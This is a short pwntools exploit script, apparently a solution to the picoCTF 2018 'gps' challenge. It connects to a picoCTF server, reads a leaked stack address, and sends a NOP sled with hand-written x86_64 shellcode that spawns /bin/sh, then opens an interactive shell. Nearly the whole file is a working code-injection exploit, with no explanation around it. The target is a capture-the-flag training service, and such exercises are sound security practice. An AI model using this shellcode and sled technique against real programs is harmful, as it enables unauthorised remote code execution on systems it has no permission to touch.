from pwn import *
r = process("./gps")
r = remote('2018shell2.picoctf.com', 49351)
def main():
	#context(os="linux",arch="x86_64")
	sh = asm(shellcraft.sh())
	p = "\x48\x31\xF6\x48\x31\xD2\x56\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xC0\x48\x83\xF0\x3B\x0F\x05"
	r.recvuntil("Current position: ")
	nop_addr = int(r.recv(16).split()[0], 16) + 0x400

	log.info("stack address : " + hex(nop_addr))

	r.sendlineafter("> ", '\x90' * (0xfff - len(p)) + p)
	r.sendlineafter("> ",hex(nop_addr))

	r.interactive()
if __name__ == '__main__':
	main()